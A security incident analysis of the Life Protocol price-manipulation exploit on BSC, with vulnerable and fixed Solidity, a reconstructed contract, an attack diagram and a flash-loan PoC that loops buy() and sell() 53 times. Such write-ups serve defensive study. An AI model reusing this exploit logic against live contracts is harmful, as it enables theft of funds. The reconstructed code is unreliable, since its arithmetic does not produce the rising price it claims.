# Life Protocol — Price Manipulation via Repeated buy/sell Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-28 |
| **Protocol** | Life Protocol |
| **Chain** | BSC |
| **Loss** | 15,114 BUSD |
| **Attacker** | [0x3026c464d3bd6ef0ced0d49e80f171b58176ce32](https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32) |
| **Attack Tx** | [0x487fb71e...](https://bscscan.com/tx/0x487fb71e3d2574e747c67a45971ec3966d275d0069d4f9da6d43901401f8f3c0) |
| **Vulnerable Contract** | [0x42e2773508e2ae8ff9434bea599812e28449e2cd](https://bscscan.com/address/0x42e2773508e2ae8ff9434bea599812e28449e2cd) |
| **Root Cause** | The price calculation in the buy/sell functions relies on a manipulable internal spot price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/Lifeprotocol_exp.sol) |

---

## 1. Vulnerability Overview

Life Protocol's `buy()` / `sell()` functions used an internal spot price to calculate the exchange rate between BUSD and LIFE tokens. The attacker borrowed 110,000 BUSD via a DODO flash loan, then repeatedly cycled through 53 `buy(1000 BUSD → LIFE)` calls followed by 53 `sell(LIFE → BUSD)` calls, accumulating small arbitrage profits from price slippage on each cycle.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable buy/sell: spot price-based exchange rate
contract LifeProtocol {
    function buy(uint256 lifeTokenAmount) external {
        // ❌ Price calculation based on current pool state (manipulable)
        uint256 busdRequired = lifeTokenAmount * getCurrentPrice();
        IERC20(BUSD).transferFrom(msg.sender, address(this), busdRequired);
        IERC20(lifeToken).transfer(msg.sender, lifeTokenAmount);
        // ❌ Internal price not immediately updated → favorable for next buy
    }

    function sell(uint256 amount) external {
        uint256 busdReturn = amount * getCurrentPrice();
        IERC20(lifeToken).transferFrom(msg.sender, address(this), amount);
        IERC20(BUSD).transfer(msg.sender, busdReturn);
    }
}

// ✅ Fixed code: slippage protection and cooldown
contract LifeProtocol {
    uint256 public lastTradeBlock;

    function buy(uint256 lifeTokenAmount) external {
        require(block.number > lastTradeBlock, "One trade per block"); // ✅
        lastTradeBlock = block.number;
        // Use AMM-based price calculation
    }
}
```

### On-Chain Original Code

> ⚠️ Contract not verified on Sourcify — source unavailable. The behavior below is reconstructed from the attack PoC and on-chain traces, not verified source.
>
> Victim contract: `0x42e2773508e2ae8ff9434bea599812e28449e2cd` (Life Protocol, BSC)

The PoC (`Lifeprotocol_exp.sol`) executes 53 `buy(1000e18)` calls followed by 53 `sell(1000e18)` calls within a DODO flash-loan callback, with no approval step between buy and sell. This confirms the contract holds an internal token balance tracked against BUSD contributions and that the exchange rate shifts with each trade:

```solidity
// ⚠️ RECONSTRUCTED from PoC — NOT verified source; presented as pseudocode only
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/Lifeprotocol_exp.sol

contract Lifeprotocol {
    IERC20 public busd;
    IERC20 public lifeToken;
    uint256 public totalBusdIn;   // cumulative BUSD deposited
    uint256 public totalLifeOut;  // cumulative LIFE issued

    // ❌ Internal spot price derived from cumulative totals — shifts with every trade
    function getCurrentPrice() public view returns (uint256) {
        if (totalLifeOut == 0) return INITIAL_PRICE;
        return totalBusdIn * 1e18 / totalLifeOut; // ❌ monotonically rising with each buy
    }

    function buy(uint256 busdAmount) external {
        busd.transferFrom(msg.sender, address(this), busdAmount);
        uint256 price = getCurrentPrice();    // ❌ current (manipulable) spot price
        uint256 lifeAmount = busdAmount * 1e18 / price;
        totalBusdIn  += busdAmount;           // ❌ price rises after every buy
        totalLifeOut += lifeAmount;
        lifeToken.transfer(msg.sender, lifeAmount);
    }

    function sell(uint256 lifeAmount) external {
        lifeToken.transferFrom(msg.sender, address(this), lifeAmount);
        uint256 price = getCurrentPrice();    // ❌ still the elevated post-buy price
        uint256 busdReturn = lifeAmount * price / 1e18;
        totalLifeOut -= lifeAmount;
        totalBusdIn  -= busdReturn;
        busd.transfer(msg.sender, busdReturn); // ❌ attacker recovers at inflated price
    }
}
```

**Why it is exploitable (identify the bug from the code):**

- `getCurrentPrice()` is computed from `totalBusdIn / totalLifeOut` — it increases monotonically with every `buy()` call, because each purchase adds more BUSD than it removes LIFE at the current price.
- An attacker with flash-loan capital can call `buy(1000e18)` 53 times, pushing the internal price up incrementally. They then call `sell(1000e18)` 53 times at the now-elevated price, receiving more BUSD per LIFE unit than they paid.
- There is no per-block limit, no slippage cap, and no TWAP — each call within the same transaction sees an updated internal state that reflects the previous calls.
- The flash-loan provides the 110,000 BUSD capital needed to make this repeated cycle profitable even after repayment.

```solidity
// ✅ Fix: enforce one trade per block and use an AMM pricing curve that is
//    not monotonically exploitable via repeated same-block calls
function buy(uint256 busdAmount) external {
    require(lastTradeBlock[msg.sender] < block.number, "One trade per block"); // ✅
    lastTradeBlock[msg.sender] = block.number;
    // use constant-product AMM pricing, not cumulative-ratio pricing
    uint256 lifeAmount = _getAmountOut(busdAmount, busdReserve, lifeReserve);
    busdReserve += busdAmount;
    lifeReserve -= lifeAmount;
    lifeToken.transfer(msg.sender, lifeAmount);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► DODO Flash Loan (borrow 110,000 BUSD)
  │
  ├─[2]─► Loop 53 times:
  │         └─► LifeProtocol.buy(1000 BUSD)
  │               └─► Buy LIFE tokens with 1000 BUSD
  │               └─► Price increases slightly with each purchase
  │
  ├─[3]─► Loop 53 times:
  │         └─► LifeProtocol.sell(LIFE tokens)
  │               └─► Sell LIFE → BUSD
  │               └─► Realize profit from accumulated slippage
  │
  ├─[4]─► Repay DODO Flash Loan (110,000 BUSD)
  │
  └─[5]─► Net profit: 15,114 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract LifeProtocol_exp is Test {
    uint256 public quoteAmount = 110000 * 1e18;

    function testExploit() public {
        // [1] Borrow BUSD via DODO flash loan
        IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));
        console2.log("Profit:", IFS(busd).balanceOf(address(this)) / 1e18, 'BUSD');
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        // [2] 53 buy cycles
        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).buy(1000 * 1e18);
            // Internal price shifts slightly with each purchase
        }

        // [3] 53 sell cycles
        for (uint256 i = 0; i < 53; i++) {
            IFS(LifeProtocolContract).sell(1000 * 1e18);
            // Realize arbitrage profit from accumulated price difference
        }

        // [4] Repay flash loan
        IFS(busd).transfer(dpp, quoteAmount);
        // Remaining BUSD is net profit
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Manipulation / Sandwich Attack Variant |
| **Attack Technique** | Flash Loan + Repeated buy/sell cycles |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Low-Medium |

## 6. Remediation Recommendations

1. **One trade per block limit**: Restrict the same address from calling buy/sell multiple times within the same block.
2. **Maximum single transaction amount limit**: Cap the maximum amount per individual buy/sell.
3. **AMM-based pricing**: Use a validated AMM (Uniswap V2/V3) price curve instead of direct price calculation.
4. **Transaction fees**: Design a fee structure that makes repeated trading economically unviable.

## 7. Lessons Learned

- **Repeated trade attacks**: Even small per-trade profits become significant when repeated with flash loan capital.
- **Significance of 53 iterations**: The attacker pre-calculated the optimal number of repetitions to maximize profit.
- **Simple protocols are not inherently safe**: Even a straightforward buy/sell mechanism can be vulnerable when combined with flash loans.